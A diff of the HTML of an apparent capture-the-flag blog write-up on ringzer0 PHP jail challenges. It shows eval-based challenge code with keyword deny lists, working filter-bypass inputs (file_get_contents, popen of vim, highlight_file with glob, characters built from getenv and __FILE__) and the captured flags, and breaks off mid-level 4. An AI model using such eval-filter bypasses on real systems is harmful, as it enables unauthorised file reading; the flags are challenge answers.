@@ -1,16 +1,97 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><title>ringzer0 CTF - Jail Escaping PHP - blog.dornea.nu</title><meta content="ringzer0 CTF - Jail Escaping PHP - blog.dornea.nu" property="title"><meta content="ringzer0 CTF - Jail Escaping PHP - blog.dornea.nu" property="og:title"><meta property="og:description" content="Here are my solutions for the ringzer0 Jail Escaping PHP challenges.
-Level 1 RingZer0 Team Online CTF PHP Jail Level 1: Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1) Flag is located at /home/level1/flag.txt Challenge PHP code: ----------------------------- <?php array_shift($_SERVER['argv']); $var = implode(&#34; &#34;, $_SERVER['argv']); if($var == null) die(&#34;PHP Jail need an argument\n&#34;); function filter($var) { if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) { return false; } return true; } if(filter($var)) { eval($var); echo &#34;Command executed&#34;; } else { echo &#34;Restricted characters has been used&#34;; } echo &#34;\n&#34;; ?"><meta property="og:type" content="article"><meta property="og:url" content="http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/"><meta property="article:published_time" content="2016-06-20T00:00:00+00:00"><meta property="article:modified_time" content="2016-06-20T00:00:00+00:00"><meta name=generator content="Hugo 0.75.1"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel=stylesheet><style type=text/css>:root{--main-color: #8C6056;--secondary-color: #AFD5AA;--logo-text-color: #fff;--body-text-color: #3d3d3d;--heading-text-color: #383838;--background-color: #fff}</style><link href=http://blog.dornea.nu/css/tachyons.min.css rel=stylesheet><link href=http://blog.dornea.nu/css/styles.css rel=stylesheet><link rel=icon href=http://blog.dornea.nu/favicon.ico type=image/x-icon><link href=http://blog.dornea.nu/feed.xml rel=alternate type=application/atom+xml title=blog.dornea.nu></head><body class=global-font><nav class="flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id=navbar><div class=flex><a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id=site-title href=http://blog.dornea.nu/ title=Home>blog.dornea.nu</a></div><div class="flex-ns mt2 mt0-ns pv1"><a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/ title=Home>Home</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://dornea.nu title=About>About</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/tags title=Tags>Tags</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org title=Zettelkasten>Zettelkasten</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bookmarks.html title=Bookmarks>Bookmarks</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bib.html title=Books>Books</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/notes title=Notes>Notes</a></div></nav><main class="center mv4 content-width ph3"><div class="f3 fw6 heading-color heading-font post-title">ringzer0 CTF - Jail Escaping PHP</div><p class="silver f6 mt1 mb4 post-meta"><time>20 Jun 2016</time>
-|
-tags: [ <a href=http://blog.dornea.nu/tags/ringzer0 class="link silver">ringzer0</a> <a href=http://blog.dornea.nu/tags/ctf class="link silver">ctf</a> <a href=http://blog.dornea.nu/tags/wargames class="link silver">wargames</a> <a href=http://blog.dornea.nu/tags/php class="link silver">php</a> ]</p><div class="lh-copy post-content"><p>Here are my solutions for the <a href=https://ringzer0team.com>ringzer0</a> <strong>Jail Escaping</strong> PHP challenges.</p><h1 id=level-1>Level 1</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>RingZer0 Team Online CTF
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
 
-PHP Jail Level <span style=color:#3677a9>1</span>:
-Current user is uid=<span style=color:#3677a9>1000</span>(level1) gid=<span style=color:#3677a9>1000</span>(level1) groups=<span style=color:#3677a9>1000</span>(level1)
+  <title>ringzer0 CTF - Jail Escaping PHP - blog.dornea.nu</title>
+  <meta content='ringzer0 CTF - Jail Escaping PHP - blog.dornea.nu' property='title' />
+  <meta content='ringzer0 CTF - Jail Escaping PHP - blog.dornea.nu' property='og:title' />
+
+
+<meta property="og:description" content="Here are my solutions for the ringzer0 Jail Escaping PHP challenges.
+Level 1 RingZer0 Team Online CTF PHP Jail Level 1: Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1) Flag is located at /home/level1/flag.txt Challenge PHP code: ----------------------------- &lt;?php array_shift($_SERVER[&#39;argv&#39;]); $var = implode(&#34; &#34;, $_SERVER[&#39;argv&#39;]); if($var == null) die(&#34;PHP Jail need an argument\n&#34;); function filter($var) { if(preg_match(&#39;/(`|open|exec|pass|system|\$|\/)/i&#39;, $var)) { return false; } return true; } if(filter($var)) { eval($var); echo &#34;Command executed&#34;; } else { echo &#34;Restricted characters has been used&#34;; } echo &#34;\n&#34;; ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/" />
+
+
+<meta property="article:published_time" content="2016-06-20T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2016-06-20T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.78.1" />
+
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
+<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
+:root {
+  --main-color: #8C6056; 
+  --secondary-color: #AFD5AA;
+  --logo-text-color: #fff;
+  --body-text-color: #3d3d3d;
+  --heading-text-color: #383838;
+  --background-color: #fff;
+}</style>
+<link href='http://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
+<link href='http://blog.dornea.nu/css/styles.css' rel="stylesheet">
+
+
+<link rel="icon" 
+ 
+  href='http://blog.dornea.nu/favicon.ico'
+
+type="image/x-icon"/>
+
+<link href='http://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />
+</head>
+<body class="global-font">
+  <nav class=" flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id="navbar">
+  <div class="flex">
+    <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id="site-title" href='http://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
+  </div>
+  
+  <div class=" flex-ns mt2 mt0-ns pv1">
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/' title="Home">Home</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://dornea.nu' title="About">About</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/tags' title="Tags">Tags</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bookmarks.html' title="Bookmarks">Bookmarks</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bib.html' title="Books">Books</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/notes' title="Notes">Notes</a>
+    
+  </div>
+  
+</nav>
+  
+<main class="center mv4 content-width ph3">
+  <div class="f3 fw6 heading-color heading-font post-title">ringzer0 CTF - Jail Escaping PHP</div>
+  <p class="silver f6 mt1 mb4 post-meta">
+    <time>20 Jun 2016</time> 
+     | 
+    
+    
+    tags: [ <a href='http://blog.dornea.nu/tags/ringzer0' class="link silver">ringzer0</a> <a href='http://blog.dornea.nu/tags/ctf' class="link silver">ctf</a> <a href='http://blog.dornea.nu/tags/wargames' class="link silver">wargames</a> <a href='http://blog.dornea.nu/tags/php' class="link silver">php </a>  ]
+    
+  </p>
+  <div class="lh-copy post-content"><p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping</strong> PHP challenges.</p>
+<h1 id="level-1">Level 1</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">RingZer0 Team Online CTF
+
+PHP Jail Level <span style="color:#3677a9">1</span>:
+Current user is uid=<span style="color:#3677a9">1000</span>(level1) gid=<span style="color:#3677a9">1000</span>(level1) groups=<span style="color:#3677a9">1000</span>(level1)
 
 Flag is located at /home/level1/flag.txt
 
@@ -18,33 +99,35 @@ Challenge PHP code:
 -----------------------------
 
 &lt;?php
-array_shift(<span style=color:#40ffff>$_SERVER</span>[<span style=color:#ed9d13>&#39;argv&#39;</span>]);
-<span style=color:#40ffff>$var</span> = implode(<span style=color:#ed9d13>&#34; &#34;</span>, <span style=color:#40ffff>$_SERVER</span>[<span style=color:#ed9d13>&#39;argv&#39;</span>]);
+array_shift(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
+<span style="color:#40ffff">$var</span> = implode(<span style="color:#ed9d13">&#34; &#34;</span>, <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
 
-<span style=color:#6ab825;font-weight:700>if</span>(<span style=color:#40ffff>$var</span> == <span style=color:#6ab825;font-weight:700>null</span>) <span style=color:#6ab825;font-weight:700>die</span>(<span style=color:#ed9d13>&#34;PHP Jail need an argument</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>);
+<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$var</span> == <span style="color:#6ab825;font-weight:bold">null</span>) <span style="color:#6ab825;font-weight:bold">die</span>(<span style="color:#ed9d13">&#34;PHP Jail need an argument</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 
-<span style=color:#6ab825;font-weight:700>function</span> <span style=color:#447fcf>filter</span>(<span style=color:#40ffff>$var</span>) {
-        <span style=color:#6ab825;font-weight:700>if</span>(preg_match(<span style=color:#ed9d13>&#39;/(`|open|exec|pass|system|\$|\/)/i&#39;</span>, <span style=color:#40ffff>$var</span>)) {
-                <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#6ab825;font-weight:700>false</span>;
+<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">filter</span>(<span style="color:#40ffff">$var</span>) {
+        <span style="color:#6ab825;font-weight:bold">if</span>(preg_match(<span style="color:#ed9d13">&#39;/(`|open|exec|pass|system|\$|\/)/i&#39;</span>, <span style="color:#40ffff">$var</span>)) {
+                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
         }
-        <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#6ab825;font-weight:700>true</span>;
+        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
 }
-<span style=color:#6ab825;font-weight:700>if</span>(filter(<span style=color:#40ffff>$var</span>)) {
-        <span style=color:#6ab825;font-weight:700>eval</span>(<span style=color:#40ffff>$var</span>);
-        <span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;Command executed&#34;</span>;
-} <span style=color:#6ab825;font-weight:700>else</span> {
-        <span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;Restricted characters has been used&#34;</span>;
+<span style="color:#6ab825;font-weight:bold">if</span>(filter(<span style="color:#40ffff">$var</span>)) {
+        <span style="color:#6ab825;font-weight:bold">eval</span>(<span style="color:#40ffff">$var</span>);
+        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Command executed&#34;</span>;
+} <span style="color:#6ab825;font-weight:bold">else</span> {
+        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Restricted characters has been used&#34;</span>;
 }
-<span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>;
-<span style=color:#cd2828;font-weight:700>?&gt;</span><span style=color:#a61717;background-color:#e3d2d2>
-</span><span style=color:#a61717;background-color:#e3d2d2>
-</span><span style=color:#a61717;background-color:#e3d2d2>-----------------------------
-</span><span style=color:#a61717;background-color:#e3d2d2>Your input:
-</span></code></pre></div><p>Pretty simple:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Your input:
+<span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>;
+<span style="color:#cd2828;font-weight:bold">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
+</span><span style="color:#a61717;background-color:#e3d2d2">
+</span><span style="color:#a61717;background-color:#e3d2d2">-----------------------------
+</span><span style="color:#a61717;background-color:#e3d2d2">Your input:
+</span></code></pre></div><p>Pretty simple:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your input:
 echo(file_get_contents(&#39;flag.txt&#39;));
 FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
-</code></pre></div><h1 id=level-2>Level 2</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>PHP Jail Level <span style=color:#3677a9>2</span>
-Current user is uid=<span style=color:#3677a9>1001</span>(level2) gid=<span style=color:#3677a9>1001</span>(level2) groups=<span style=color:#3677a9>1001</span>(level2)
+</code></pre></div><h1 id="level-2">Level 2</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">PHP Jail Level <span style="color:#3677a9">2</span>
+Current user is uid=<span style="color:#3677a9">1001</span>(level2) gid=<span style="color:#3677a9">1001</span>(level2) groups=<span style="color:#3677a9">1001</span>(level2)
 
 Flag is located at /home/level2/flag.txt
 
@@ -52,33 +135,37 @@ Challenge PHP code:
 -----------------------------
 
 &lt;?php
-array_shift(<span style=color:#40ffff>$_SERVER</span>[<span style=color:#ed9d13>&#39;argv&#39;</span>]);
-<span style=color:#40ffff>$var</span> = implode(<span style=color:#ed9d13>&#34; &#34;</span>, <span style=color:#40ffff>$_SERVER</span>[<span style=color:#ed9d13>&#39;argv&#39;</span>]);
+array_shift(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
+<span style="color:#40ffff">$var</span> = implode(<span style="color:#ed9d13">&#34; &#34;</span>, <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
 
-<span style=color:#6ab825;font-weight:700>if</span>(<span style=color:#40ffff>$var</span> == <span style=color:#6ab825;font-weight:700>null</span>) <span style=color:#6ab825;font-weight:700>die</span>(<span style=color:#ed9d13>&#34;PHP Jail need an argument</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>);
+<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$var</span> == <span style="color:#6ab825;font-weight:bold">null</span>) <span style="color:#6ab825;font-weight:bold">die</span>(<span style="color:#ed9d13">&#34;PHP Jail need an argument</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 
-<span style=color:#6ab825;font-weight:700>function</span> <span style=color:#447fcf>filter</span>(<span style=color:#40ffff>$var</span>) {
-        <span style=color:#6ab825;font-weight:700>if</span>(preg_match(<span style=color:#ed9d13>&#39;/(\/|a|c|s|require|include|flag|eval|file)/i&#39;</span>, <span style=color:#40ffff>$var</span>)) {
-                <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#6ab825;font-weight:700>false</span>;
+<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">filter</span>(<span style="color:#40ffff">$var</span>) {
+        <span style="color:#6ab825;font-weight:bold">if</span>(preg_match(<span style="color:#ed9d13">&#39;/(\/|a|c|s|require|include|flag|eval|file)/i&#39;</span>, <span style="color:#40ffff">$var</span>)) {
+                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
         }
-        <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#6ab825;font-weight:700>true</span>;
+        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
 }
-<span style=color:#6ab825;font-weight:700>if</span>(filter(<span style=color:#40ffff>$var</span>)) {
-        <span style=color:#6ab825;font-weight:700>eval</span>(<span style=color:#40ffff>$var</span>);
-        <span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;Command executed&#34;</span>;
-} <span style=color:#6ab825;font-weight:700>else</span> {
-        <span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;Restricted characters has been used&#34;</span>;
+<span style="color:#6ab825;font-weight:bold">if</span>(filter(<span style="color:#40ffff">$var</span>)) {
+        <span style="color:#6ab825;font-weight:bold">eval</span>(<span style="color:#40ffff">$var</span>);
+        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Command executed&#34;</span>;
+} <span style="color:#6ab825;font-weight:bold">else</span> {
+        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Restricted characters has been used&#34;</span>;
 }
-<span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>;
-<span style=color:#cd2828;font-weight:700>?&gt;</span><span style=color:#a61717;background-color:#e3d2d2>
-</span><span style=color:#a61717;background-color:#e3d2d2>
-</span><span style=color:#a61717;background-color:#e3d2d2>-----------------------------
-</span><span style=color:#a61717;background-color:#e3d2d2>Your input:
-</span><span style=color:#a61717;background-color:#e3d2d2>
+<span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>;
+<span style="color:#cd2828;font-weight:bold">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
+</span><span style="color:#a61717;background-color:#e3d2d2">
+</span><span style="color:#a61717;background-color:#e3d2d2">-----------------------------
+</span><span style="color:#a61717;background-color:#e3d2d2">Your input:
+</span><span style="color:#a61717;background-color:#e3d2d2">
 </span></code></pre></div><p>Since some functions (like <code>fread</code>, <code>file_get_contents</code> are not allowed) we can use <code>popen</code> to start an external command in order to
-read the flag.txt:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>popen(&#34;vim&#34;, &#34;w&#34;);
-</code></pre></div><p>This <code>vim</code> is started and we can read the <code>flag.txt</code> by loading it into the buffer:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>:r flag.txt
-</code></pre></div><p>Flag: FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL</p><h1 id=level-3>Level 3</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>RingZer0 Team Online CTF
+read the flag.txt:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">popen(&#34;vim&#34;, &#34;w&#34;);
+</code></pre></div><p>This <code>vim</code> is started and we can read the <code>flag.txt</code> by loading it into the buffer:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">:r flag.txt
+</code></pre></div><p>Flag: FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL</p>
+<h1 id="level-3">Level 3</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF
 
 PHP Jail Level 3:
 Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)
@@ -114,12 +201,14 @@ echo &#34;\n&#34;;
 
 -----------------------------
 
-</code></pre></div><p>Since a lot of functions have been disabled, one must find a function that is <strong>allowed</strong> and doesn&rsquo;t contain any restricted characters. <a href=http://php.net/manual/en/function.highlight-file.php>highlight_file</a> is one of those functions:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>Your input:
-highlight_file(glob(<span style=color:#ed9d13>&#34;fl*txt&#34;</span>)[<span style=color:#3677a9>0</span>]);
-&lt;code&gt;&lt;span style=<span style=color:#ed9d13>&#34;color: #000000&#34;</span>&gt;
+</code></pre></div><p>Since a lot of functions have been disabled, one must find a function that is <strong>allowed</strong> and doesn&rsquo;t contain any restricted characters. <a href="http://php.net/manual/en/function.highlight-file.php">highlight_file</a> is one of those functions:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">Your input:
+highlight_file(glob(<span style="color:#ed9d13">&#34;fl*txt&#34;</span>)[<span style="color:#3677a9">0</span>]);
+&lt;code&gt;&lt;span style=<span style="color:#ed9d13">&#34;color: #000000&#34;</span>&gt;
 FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H&lt;br /&gt;&lt;/span&gt;
 &lt;/code&gt;Command executed
-</code></pre></div><h1 id=level-4>Level 4</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>RingZer0 Team Online CTF
+</code></pre></div><h1 id="level-4">Level 4</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF
 
 PHP Jail Level 4:
 Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)
@@ -156,57 +245,71 @@ echo &#34;\n&#34;;
 -----------------------------
 Your input:
 
-</code></pre></div><p>As you can notice <code>highlight_source</code> is <em>not</em> disabled, so you can use sth like:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>highlight_source(<span style=color:#ed9d13>&#34;flag.txt&#34;</span>);
-</code></pre></div><p>However, double quotes and the characters &ldquo;a&rdquo; and &ldquo;.&rdquo; are not allowed. Next idea was to use <code>glob</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>highlight_source(glob(<span style=color:#ed9d13>&#34;*&#34;</span>)[<span style=color:#3677a9>4</span>]);
+</code></pre></div><p>As you can notice <code>highlight_source</code> is <em>not</em> disabled, so you can use sth like:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">highlight_source(<span style="color:#ed9d13">&#34;flag.txt&#34;</span>);
+</code></pre></div><p>However, double quotes and the characters &ldquo;a&rdquo; and &ldquo;.&rdquo; are not allowed. Next idea was to use <code>glob</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">highlight_source(glob(<span style="color:#ed9d13">&#34;*&#34;</span>)[<span style="color:#3677a9">4</span>]);
 </code></pre></div><p>But again: Double quotes and the &ldquo;*&rdquo; character are not allowed. Since my solution is kind of complicated, I&rsquo;ll try to explain what
-my thoughts were:</p><p>a) I needed the &ldquo;/&rdquo; character (is also not allowed)
+my thoughts were:</p>
+<p>a) I needed the &ldquo;/&rdquo; character (is also not allowed)
 b) I needed the &ldquo;a&rdquo; character
 c) I needed a way to define a string without using double quotes
-d) I wanted to somehow build the string &ldquo;/home/level4/flag.txt&rdquo; with allowed characters and use it with <code>glob</code></p><p>Now the solutions to every particular problem:</p><p>a) Using <code>phpinfo();</code> I&rsquo;ve found out that there were some <em>environment</em> variables I could use to extract the &ldquo;/&rdquo;. Then I ran:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>print_r(getenv(HOME));
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HOME - assumed <span style=color:#ed9d13>&#39;HOME&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>d code on line <span style=color:#3677a9>1</span>
+d) I wanted to somehow build the string &ldquo;/home/level4/flag.txt&rdquo; with allowed characters and use it with <code>glob</code></p>
+<p>Now the solutions to every particular problem:</p>
+<p>a) Using <code>phpinfo();</code> I&rsquo;ve found out that there were some <em>environment</em> variables I could use to extract the &ldquo;/&rdquo;. Then I ran:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">print_r(getenv(HOME));
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HOME - assumed <span style="color:#ed9d13">&#39;HOME&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>d code on line <span style="color:#3677a9">1</span>
 /home/level4Command executed
-</code></pre></div><p>Then I could extract the &ldquo;/&rdquo; by using</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>getenv(HOME)[<span style=color:#3677a9>0</span>];
-</code></pre></div><p>b) PHP has some <strong>predefined constants</strong> like <code>__FILE__</code>, <code>__DIR__</code> and so on:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>print_r(<span style=color:#40ffff>__FILE__</span>);
-/home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>d codeCommand executed
-</code></pre></div><p>Using <code>__FILE__</code> I can extract &ldquo;a&rdquo; and &ldquo;.&rdquo;.</p><p>c) Using <code>define()</code>, <code>implode()</code>/<code>explode()</code> one could define contants as strings and use array operations to extract/concat characters:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>define(HEY,<span style=color:#40ffff>__FILE__</span>);print_r(explode(getenv(HOME)[<span style=color:#3677a9>0</span>],HEY));
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HEY - assumed <span style=color:#ed9d13>&#39;HEY&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-<span style=color:#6ab825;font-weight:700>Array</span>
+</code></pre></div><p>Then I could extract the &ldquo;/&rdquo; by using</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">getenv(HOME)[<span style="color:#3677a9">0</span>];
+</code></pre></div><p>b) PHP has some <strong>predefined constants</strong> like <code>__FILE__</code>, <code>__DIR__</code> and so on:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">print_r(<span style="color:#40ffff">__FILE__</span>);
+/home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>d codeCommand executed
+</code></pre></div><p>Using <code>__FILE__</code> I can extract &ldquo;a&rdquo; and &ldquo;.&rdquo;.</p>
+<p>c) Using <code>define()</code>, <code>implode()</code>/<code>explode()</code> one could define contants as strings and use array operations to extract/concat characters:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">define(HEY,<span style="color:#40ffff">__FILE__</span>);print_r(explode(getenv(HOME)[<span style="color:#3677a9">0</span>],HEY));
